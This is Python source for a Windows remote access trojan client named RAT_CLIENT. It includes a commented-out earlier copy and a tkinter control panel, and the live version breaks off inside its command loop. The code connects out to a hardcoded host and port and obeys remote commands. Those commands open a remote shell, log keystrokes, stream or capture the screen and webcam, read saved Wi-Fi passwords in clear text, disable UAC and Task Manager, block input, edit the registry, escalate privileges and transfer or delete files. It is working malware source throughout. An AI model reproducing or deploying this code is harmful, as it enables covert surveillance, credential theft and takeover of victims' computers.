#chlla hai 

# import random
# import socket, subprocess, os, platform
# from threading import Thread
# from PIL import Image
# from datetime import datetime
# from ctypes import cast, POINTER
# from comtypes import CLSCTX_ALL
# from winreg import *
# import shutil
# import glob
# import ctypes
# import sys
# import webbrowser
# import re
# import pyautogui
# import cv2
# import urllib.request
# import json
# from pynput.keyboard import Listener
# from pynput.mouse import Controller
# import time
# import keyboard

# user32 = ctypes.WinDLL('user32')
# kernel32 = ctypes.WinDLL('kernel32')

# HWND_BROADCAST = 65535
# WM_SYSCOMMAND = 274
# SC_MONITORPOWER = 61808
# GENERIC_READ = -2147483648
# GENERIC_WRITE = 1073741824
# FILE_SHARE_WRITE = 2
# FILE_SHARE_READ = 1
# FILE_SHARE_DELETE = 4
# CREATE_ALWAYS = 2

# class RAT_CLIENT:
#     def __init__(self, host, port):
#         self.host = host
#         self.port = port
#         self.curdir = os.getcwd()

#     def build_connection(self):
#         global s
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.connect((self.host, self.port))
#         sending = socket.gethostbyname(socket.gethostname())
#         s.send(sending.encode())
    
#     def errorsend(self):
#         output = bytearray("no output", encoding='utf8')
#         for i in range(len(output)):
#             output[i] ^= 0x41
#         s.send(output)
    
#     def keylogger(self):
#         def on_press(key):
#             if klgr == True:
#                 with open('keylogs.txt', 'a') as f:
#                     f.write(f'{key}')
#                     f.close()

#         with Listener(on_press=on_press) as listener:
#             listener.join()
    
#     def block_task_manager(self):
#         if ctypes.windll.shell32.IsUserAnAdmin() == 1:
#             while (1):
#                 if block == True:
#                     hwnd = user32.FindWindowW(0, "Task Manager")
#                     user32.ShowWindow(hwnd, 0)
#                     ctypes.windll.kernel32.Sleep(500)
    
#     def disable_all(self):
#         while True:
#             user32.BlockInput(True)
    
#     def disable_mouse(self):
#         mouse = Controller()
#         t_end = time.time() + 3600*24*11
#         while time.time() < t_end and mousedbl == True:
#             mouse.position = (0, 0)
    
#     def disable_keyboard(self):
#         for i in range(150):
#             if kbrd == True:
#                 keyboard.block_key(i)
#         time.sleep(999999)
    
#     def execute(self):
#         while True:
#             command = s.recv(1024).decode()
            
#             if command == 'shell':
#                 while 1:
#                     command = s.recv(1024).decode()
#                     if command.lower() == 'exit' :
#                         print("You are free from our control ;))")
#                         break
#                     if command == 'cd':
#                         os.chdir(command[3:].decode('utf-8'))
#                         dir = os.getcwd()
#                         dir1 = str(dir)
#                         s.send(dir1.encode())
#                     output = subprocess.getoutput(command)
#                     s.send(output.encode())
#                     if not output:
#                         self.errorsend()
            
#             elif command == 'screenshare':
#                 try:
#                     from vidstream import ScreenShareClient
#                     screen = ScreenShareClient(self.host, 8080)
#                     screen.start_stream()
#                 except:
#                     s.send("Impossible to get screen")
            
#             elif command == 'webcam':
#                 try:
#                     from vidstream import CameraClient
#                     cam = CameraClient(self.host, 8080)
#                     cam.start_stream()
#                 except:
#                     s.send("Impossible to get webcam")
            
#             elif command == 'breakstream':
#                 pass

#             elif command == 'list':
#                 pass

#             elif command == 'geolocate':
#                 with urllib.request.urlopen("https://geolocation-db.com/json") as url:
#                     data = json.loads(url.read().decode())
#                     link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
#                 s.send(link.encode())
            
#             elif command == 'setvalue':
#                 const = s.recv(1024).decode()
#                 root = s.recv(1024).decode()
#                 key2 = s.recv(1024).decode()
#                 value = s.recv(1024).decode()
#                 try:
#                     if const == 'HKEY_CURRENT_USER':
#                         key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
#                         SetValueEx(key, key2, 0, REG_SZ, str(value))
#                         CloseKey(key)
#                     if const == 'HKEY_CLASSES_ROOT':
#                         key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
#                         SetValueEx(key, key2, 0, REG_SZ, str(value))
#                         CloseKey(key)
#                     if const == 'HKEY_LOCAL_MACHINE':
#                         key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
#                         SetValueEx(key, key2, 0, REG_SZ, str(value))
#                         CloseKey(key)
#                     if const == 'HKEY_USERS':
#                         key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
#                         SetValueEx(key, key2, 0, REG_SZ, str(value))
#                         CloseKey(key)
#                     if const == 'HKEY_CLASSES_ROOT':
#                         key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
#                         SetValueEx(key, key2, 0, REG_SZ, str(value))
#                         CloseKey(key)
#                     if const == 'HKEY_CURRENT_CONFIG':
#                         key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
#                         SetValueEx(key, key2, 0, REG_SZ, str(value))
#                         CloseKey(key)
#                     s.send("Value is set".encode())
#                 except:
#                     s.send("Impossible to create key".encode())
            
#             elif command == 'delkey':
#                 const = s.recv(1024).decode()
#                 root = s.recv(1024).decode()
#                 try:
#                     if const == 'HKEY_CURRENT_USER':
#                         DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
#                     if const == 'HKEY_LOCAL_MACHINE':
#                         DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
#                     if const == 'HKEY_USERS':
#                         DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
#                     if const == 'HKEY_CLASSES_ROOT':
#                         DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
#                     if const == 'HKEY_CURRENT_CONFIG':
#                         DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
#                     s.send("Key is deleted".encode())
#                 except:
#                     s.send("Impossible to delete key".encode())
            
#             elif command == 'createkey':
#                 const = s.recv(1024).decode()
#                 root = s.recv(1024).decode()
#                 try:
#                     if const == 'HKEY_CURRENT_USER':
#                         CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
#                     if const == 'HKEY_LOCAL_MACHINE':
#                         CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
#                     if const == 'HKEY_USERS':
#                         CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
#                     if const == 'HKEY_CLASSES_ROOT':
#                         CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
#                     if const == 'HKEY_CURRENT_CONFIG':
#                         CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
#                     s.send("Key is created".encode())
#                 except:
#                     s.send("Impossible to create key".encode())
            
#             elif command == 'volumeup':
#                 try:
#                     from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
#                     devices = AudioUtilities.GetSpeakers()
#                     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
#                     volume = cast(interface, POINTER(IAudioEndpointVolume))
#                     if volume.GetMute() == 1:
#                         volume.SetMute(0, None)
#                     volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
#                     s.send("Volume is increased to 100%".encode())
#                 except:
#                     s.send("Module is not founded".encode())
            
#             elif command == 'volumedown':
#                 try:
#                     from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
#                     devices = AudioUtilities.GetSpeakers()
#                     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
#                     volume = cast(interface, POINTER(IAudioEndpointVolume))
#                     volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
#                     s.send("Volume is decreased to 0%".encode())
#                 except:
#                     s.send("Module is not founded".encode())
            
#             elif command == 'setwallpaper':
#                 pic = s.recv(6000).decode()
#                 try:
#                     ctypes.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
#                     s.send(f'{pic} is set as a wallpaper'.encode())
#                 except:
#                     s.send("No such file")

#             elif command == 'usbdrivers':
#                 p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
#                 s.send(p.encode())
            
#             elif command == 'monitors':
#                 p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
#                 s.send(p.encode())

#             elif command == 'sysinfo':
#                 sysinfo = str(f'''
# System: {platform.platform()} {platform.win32_edition()}
# Architecture: {platform.architecture()}
# Name of Computer: {platform.node()}
# Processor: {platform.processor()}
# Python: {platform.python_version()}
# Java: {platform.java_ver()}
# User: {os.getlogin()}
#                 ''')
#                 s.send(sysinfo.encode())
            
#             elif command == 'reboot':
#                 os.system("shutdown /r /t 1")
#                 s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
            
#             elif command[:7] == 'writein':
#                 pyautogui.write(command.split(" ")[1])
#                 s.send(f'{command.split(" ")[1]} is written'.encode())
            
#             elif command[:8] == 'readfile':
#                 try:
#                     f = open(command[9:], 'r')
#                     data = f.read()
#                     if not data: s.send("No data".encode())
#                     f.close()
#                     s.send(data.encode())
#                 except:
#                     s.send("No such file in directory".encode())
            
#             elif command[:7] == 'abspath':
#                 try:
#                     path = os.path.abspath(command[8:])
#                     s.send(path.encode())
#                 except:
#                     s.send("No such file in directory".encode())

#             elif command == 'pwd':
#                 curdir = str(os.getcwd())
#                 s.send(curdir.encode())
            
#             elif command == 'ipconfig':
#                 output = subprocess.check_output('ipconfig', encoding='oem')
#                 s.send(output.encode())
            
#             elif command == 'portscan':
#                 output = subprocess.check_output('netstat -an', encoding='oem')
#                 s.send(output.encode())
            
#             elif command == 'tasklist':
#                 output = subprocess.check_output('tasklist', encoding='oem')
#                 s.send(output.encode())

#             elif command == 'profiles':
#                 output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
#                 s.send(output.encode())
            
#             elif command == 'profilepswd':
#                 profile = s.recv(6000)
#                 profile = profile.decode()
#                 try:
#                     output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
#                     s.send(output.encode())
#                 except:
#                     self.errorsend()
            
#             elif command == 'systeminfo':
#                 output = subprocess.check_output(f'systeminfo', encoding='oem')
#                 s.send(output.encode())
            
#             elif command == 'sendmessage':
#                 text = s.recv(6000).decode()
#                 title = s.recv(6000).decode()
#                 s.send('MessageBox has appeared'.encode())
#                 user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
            
#             elif command.startswith("disable") and command.endswith("--all"):
#                 Thread(target=self.disable_all, daemon=True).start()
#                 s.send("Keyboard and mouse are disabled".encode())
            
#             elif command.startswith("disable") and command.endswith("--keyboard"):
#                 global kbrd
#                 kbrd = True
#                 Thread(target=self.disable_keyboard, daemon=True).start()
#                 s.send("Keyboard is disabled".encode())
            
#             elif command.startswith("disable") and command.endswith("--mouse"):
#                 global mousedbl
#                 mousedbl = True
#                 Thread(target=self.disable_mouse, daemon=True).start()
#                 s.send("Mouse is disabled".encode())
            
#             elif command == 'disableUAC':
#                 os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
            
#             elif command.startswith("enable") and command.endswith("--keyboard"):
#                 kbrd = False
#                 s.send("Mouse and keyboard are unblocked".encode())
            
#             elif command.startswith("enable") and command.endswith("--mouse"):
#                 mousedbl = False
#                 s.send("Mouse is enabled".encode())

#             elif command.startswith("enable") and command.endswith("--all"):
#                 user32.BlockInput(False)
#                 s.send("Keyboard and mouse are enabled".encode())
                
#             elif command == 'turnoffmon':
#                 s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
#                 user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            
#             elif command == 'turnonmon':
#                 s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
#                 user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            
#             elif command == 'extendrights':
#                 ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
#                 sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
#                 s.send(sending.encode())
            
#             elif command == 'isuseradmin':
#                 if ctypes.windll.shell32.IsUserAnAdmin() == 1:
#                     sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
#                     s.send(sending.encode())
#                 else:
#                     sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
#                     s.send(sending.encode())

#             elif command == 'keyscan_start':
#                 global klgr
#                 klgr = True
#                 kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
#                 FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
#                 None, CREATE_ALWAYS , 0, 0)
#                 Thread(target=self.keylogger, daemon=True).start()
#                 s.send("Keylogger is started".encode())
            
#             elif command == 'send_logs':
#                 try:
#                     f = open("keylogs.txt", 'r')
#                     lines = f.readlines()
#                     f.close()
#                     s.send(str(lines).encode())
#                     os.remove('keylogs.txt')
#                 except:
#                     self.errorsend()
            
#             elif command == 'stop_keylogger':
#                 klgr = False
#                 s.send("The session of keylogger is terminated".encode())
            
#             elif command == 'cpu_cores':
#                 output = os.cpu_count()
#                 s.send(str(output).encode())

#             elif command[:7] == 'delfile':
#                 try:
#                     os.remove(command[8:])
#                     s.send(f'{command[8:]} was successfully deleted'.encode())
#                 except:
#                     self.errorsend()
            
#             elif command[:8] == 'editfile':
#                 try:
#                     with open(command.split(" ")[1], 'a') as f:
#                         f.write(command.split(" ")[2])
#                         f.close()
#                     sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
#                     s.send(sending.encode())
#                 except:
#                     self.errorsend()
            
#             elif command[:2] == 'cp':
#                 try: 
#                     shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
#                     s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
#                 except:
#                     self.errorsend()
            
#             elif command[:2] == 'mv':
#                 try:
#                     shutil.move(command.split(" ")[1], command.split(" ")[2])
#                     s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
#                 except:
#                     self.errorsend()
            
#             elif command[:2] == 'cd':
#                 command = command[3:]
#                 try:
#                     os.chdir(command)
#                     curdir = str(os.getcwd())
#                     s.send(curdir.encode())
#                 except:
#                     s.send("No such directory".encode())
            
#             elif command == 'cd ..':
#                 os.chdir('..')
#                 curdir = str(os.getcwd())
#                 s.send(curdir.encode())
            
#             elif command == 'dir':
#                 try:
#                     output = subprocess.check_output(["dir"], shell=True)
#                     output = output.decode('utf8', errors='ignore')
#                     s.send(output.encode())
#                 except:
#                     self.errorsend()
            
#             elif command[1:2] == ':':
#                 try:
#                     os.chdir(command)
#                     curdir = str(os.getcwd())
#                     s.send(curdir.encode())
#                 except: 
#                     s.send("No such directory".encode())
            
#             elif command[:10] == 'createfile':
#                 kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
#                 FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
#                 None, CREATE_ALWAYS , 0, 0)
#                 s.send(f'{command[11:]} was created'.encode())

#             elif command[:10] == 'searchfile':
#                 for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
#                     if x.endswith(command.split(" ")[1]):
#                         path = os.path.abspath(x)
#                         s.send(str(path).encode())
#                     else:
#                         continue
            
#             elif command == 'curpid':
#                 pid = os.getpid()
#                 s.send(str(pid).encode())
            
#             elif command == 'drivers':
#                 drives = []
#                 bitmask = kernel32.GetLogicalDrives()
#                 letter = ord('A')
#                 while bitmask > 0:
#                     if bitmask & 1:
#                         drives.append(chr(letter) + ':\\')
#                     bitmask >>= 1
#                     letter += 1
#                 s.send(str(drives).encode())
            
#             elif command[:4] == 'kill':
#                 try:
#                     os.system(f'TASKKILL /F /im {command[5:]}')
#                     s.send(f'{command[5:]} was terminated'.encode())
#                 except:
#                     self.errorsend()
            
#             elif command == 'shutdown':
#                 os.system('shutdown /s /t 1')
#                 sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
#                 s.send()
            
#             elif command == 'disabletaskmgr':
#                 global block
#                 block = True
#                 Thread(target=self.block_task_manager, daemon=True).start()
#                 s.send("Task Manager is disabled".encode())
            
#             elif command == 'enabletaskmgr':
#                 block = False
#                 s.send("Task Manager is enabled".encode())
            
#             elif command == 'localtime':
#                 now = datetime.now()
#                 current_time = now.strftime("%H:%M:%S")
#                 s.send(str(current_time).encode())
            
#             elif command[:9] == 'startfile':
#                 try:
#                     s.send(f'{command[10:]} was started'.encode())
#                     os.startfile(command[10:])
#                 except:
#                     self.errorsend()

#             elif command[:8] == 'download':
#                 try:
#                     file = open(command.split(" ")[1], 'rb')
#                     data = file.read()
#                     s.send(data)
#                 except:
#                     self.errorsend()

#             elif command == 'upload':
#                 filename = s.recv(6000)
#                 newfile = open(filename, 'wb')
#                 data = s.recv(6000)
#                 newfile.write(data)
#                 newfile.close()
            
#             elif command[:5] == 'mkdir':
#                 try:
#                     os.mkdir(command[6:])
#                     s.send(f'Directory {command[6:]} was created'.encode())
#                 except:
#                     self.errorsend()
            
#             elif command[:5] == 'rmdir':
#                 try:
#                     shutil.rmtree(command[6:])
#                     s.send(f'Directory {command[6:]} was removed'.encode())
#                 except:
#                     self.errorsend()
            
#             elif command == 'browser':
#                 quiery = s.recv(6000)
#                 quiery = quiery.decode()
#                 try:
#                     if re.search(r'\.', quiery):
#                         webbrowser.open_new_tab('https://' + quiery)
#                     elif re.search(r'\ ', quiery):
#                         webbrowser.open_new_tab('https://yandex.ru/search/?text='+quiery)
#                     else:
#                         webbrowser.open_new_tab('https://yandex.ru/search/?text=' + quiery)
#                     s.send("The tab is opened".encode())
#                 except:
#                     self.errorsend()
            
#             elif command == 'screenshot':
#                 try:
#                     file = f'{random.randint(111111, 444444)}.png'
#                     file2 = f'{random.randint(555555, 999999)}.png'
#                     pyautogui.screenshot(file)
#                     image = Image.open(file)
#                     new_image = image.resize((1920, 1080))
#                     new_image.save(file2)
#                     file = open(file2, 'rb')
#                     data = file.read()
#                     s.send(data)
#                 except:
#                     self.errorsend()
            
#             elif command == 'webcam_snap':
#                 try:
#                     file = f'{random.randint(111111, 444444)}.png'
#                     file2 = f'{random.randint(555555, 999999)}.png'
#                     global return_value, i
#                     cam = cv2.VideoCapture(0)
#                     for i in range(1):
#                         return_value, image = cam.read()
#                         filename = cv2.imwrite(f'{file}', image)
#                     del(cam)
#                     image = Image.open(file)
#                     new_image = image.resize((1920, 1080))
#                     new_image.save(file2)
#                     file = open(file2, 'rb')
#                     data = file.read()
#                     s.send(data)
#                 except:
#                     self.errorsend()

#             elif command == 'exit':
#                 print("You are free from our control ;)")
#                 #s.send(b"exit")
#                 break

# rat = RAT_CLIENT('192.168.0.101', 4444)

# if __name__ == '__main__':
    # rat.build_connection()
    # rat.execute()

#chlta gui

# class RATInterface:
#     def __init__(self, root):
#         self.root = root
#         self.root.title("RAT Control Panel")
        
#         # Create buttons
#         self.connect_button = tk.Button(root, text="Connect", command=self.connect_to_server)
#         self.connect_button.pack()

#         self.disconnect_button = tk.Button(root, text="Disconnect", command=self.disconnect_from_server,state=tk.DISABLED)
#         self.disconnect_button.pack()

#         # Create entry for IP and port
#         self.ip_label = tk.Label(root, text="Server IP:")
#         self.ip_label.pack()
#         self.ip_entry = tk.Entry(root)
#         self.ip_entry.pack()

#         self.port_label = tk.Label(root, text="Port:")
#         self.port_label.pack()
#         self.port_entry = tk.Entry(root)
#         self.port_entry.pack()

#     def connect_to_server(self):
#         ip = self.ip_entry.get()
#         port = int(self.port_entry.get())
#         try:
#             self.rat_client = RAT_CLIENT(ip, port)
#             self.rat_client.build_connection()
#             messagebox.showinfo("Success", "Connected to server successfully!")
#             self.root.destroy()  # Close the window after successful connection
#             self.rat_client.execute()
#         except Exception as e:
#             messagebox.showerror("Error", f"Failed to connect: {str(e)}")

#     def disconnect_from_server(self):
#         try:
#             self.rat_client.s.send(b"exit")
#             self.rat_client.s.close()
#             messagebox.showinfo("Success", "Disconnected from server!")
#         except Exception as e:
#             messagebox.showerror("Error", f"Failed to disconnect: {str(e)}")
# def main():
#     root = tk.Tk()
#     app = RATInterface(root)
#     root.mainloop()

# if __name__ == '__main__':
#     main()


#final code 
import random
import socket, subprocess, os, platform
from threading import Thread
from PIL import Image
from datetime import datetime
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from winreg import *
import shutil
import glob
import ctypes
import sys
import webbrowser
import re
import pyautogui
import cv2
import urllib.request
import json
from pynput.keyboard import Listener
from pynput.mouse import Controller
import time
import keyboard
import tkinter as tk
from tkinter import messagebox
from tkinter.font import Font
from tkinter import ttk
user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        s.send(sending.encode())
    
    def errorsend(self):
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        s.send(output)
    
    def keylogger(self):
        def on_press(key):
            if klgr == True:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()
    
    def block_task_manager(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            while (1):
                if block == True:
                    hwnd = user32.FindWindowW(0, "Task Manager")
                    user32.ShowWindow(hwnd, 0)
                    ctypes.windll.kernel32.Sleep(500)
    
    def disable_all(self):
        while True:
            user32.BlockInput(True)
    
    def disable_mouse(self):
        mouse = Controller()
        t_end = time.time() + 3600*24*11
        while time.time() < t_end and mousedbl == True:
            mouse.position = (0, 0)
    
    def disable_keyboard(self):
        for i in range(150):
            if kbrd == True:
                keyboard.block_key(i)
        time.sleep(999999)
    
    def execute(self):
        while True:
            command = s.recv(1024).decode()
            
            if command == 'shell':
                while 1:
                    command = s.recv(1024).decode()
                    if command.lower() == 'exit' :
                        break
                    if command == 'cd':
                        os.chdir(command[3:].decode('utf-8'))
                        dir = os.getcwd()
                        dir1 = str(dir)
                        s.send(dir1.encode())
                    output = subprocess.getoutput(command)
                    s.send(output.encode())
                    if not output:
                        self.errorsend()
            
            elif command == 'screenshare':
                try:
                    from vidstream import ScreenShareClient
                    screen = ScreenShareClient(self.host, 8080)
                    screen.start_stream()
                except:
                    s.send("Impossible to get screen")
            
            elif command == 'webcam':
                try:
                    from vidstream import CameraClient
                    cam = CameraClient(self.host, 8080)
                    cam.start_stream()
                except:
                    s.send("Impossible to get webcam")
            
            elif command == 'breakstream':
                pass

            elif command == 'list':
                pass

            elif command == 'geolocate':
                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                    data = json.loads(url.read().decode())
                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                s.send(link.encode())
            
            elif command == 'setvalue':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                key2 = s.recv(1024).decode()
                value = s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CLASSES_ROOT':
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_LOCAL_MACHINE':
                        key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_USERS':
                        key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CLASSES_ROOT':
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CURRENT_CONFIG':
                        key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    s.send("Value is set".encode())
                except:
                    s.send("Impossible to create key".encode())
            
            elif command == 'delkey':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_LOCAL_MACHINE':
                        DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_USERS':
                        DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_CLASSES_ROOT':
                        DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_CURRENT_CONFIG':
                        DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
                    s.send("Key is deleted".encode())
                except:
                    s.send("Impossible to delete key".encode())
            
            elif command == 'createkey':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_LOCAL_MACHINE':
                        CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_USERS':
                        CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_CLASSES_ROOT':
                        CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_CURRENT_CONFIG':
                        CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                    s.send("Key is created".encode())
                except:
                    s.send("Impossible to create key".encode())
            
            elif command == 'volumeup':
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute(0, None)
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
                    s.send("Volume is increased to 100%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif command == 'volumedown':
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
                    s.send("Volume is decreased to 0%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif command == 'setwallpaper':
                pic = s.recv(6000).decode()
                try:
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
                    s.send(f'{pic} is set as a wallpaper'.encode())
                except:
                    s.send("No such file")

            elif command == 'usbdrivers':
                p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
                s.send(p.encode())
            
            elif command == 'monitors':
                p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
                s.send(p.encode())

            elif command == 'sysinfo':
                sysinfo = str(f'''
System: {platform.platform()} {platform.win32_edition()}
Architecture: {platform.architecture()}
Name of Computer: {platform.node()}
Processor: {platform.processor()}
Python: {platform.python_version()}
Java: {platform.java_ver()}
User: {os.getlogin()}
                ''')
                s.send(sysinfo.encode())
            
            elif command == 'reboot':
                os.system("shutdown /r /t 1")
                s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
            
            elif command[:7] == 'writein':
                pyautogui.write(command.split(" ")[1])
                s.send(f'{command.split(" ")[1]} is written'.encode())
            
            elif command[:8] == 'readfile':
                try:
                    f = open(command[9:], 'r')
                    data = f.read()
                    if not data: s.send("No data".encode())
                    f.close()
                    s.send(data.encode())
                except:
                    s.send("No such file in directory".encode())
            
            elif command[:7] == 'abspath':
                try:
                    path = os.path.abspath(command[8:])
                    s.send(path.encode())
                except:
                    s.send("No such file in directory".encode())

            elif command == 'pwd':
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif command == 'ipconfig':
                output = subprocess.check_output('ipconfig', encoding='oem')
                s.send(output.encode())
            
            elif command == 'portscan':
                output = subprocess.check_output('netstat -an', encoding='oem')
                s.send(output.encode())
            
            elif command == 'tasklist':
                output = subprocess.check_output('tasklist', encoding='oem')
                s.send(output.encode())

            elif command == 'profiles':
                output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
                s.send(output.encode())
            
            elif command == 'profilepswd':
                profile = s.recv(6000)
                profile = profile.decode()
                try:
                    output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
                    s.send(output.encode())
                except:
                    self.errorsend()
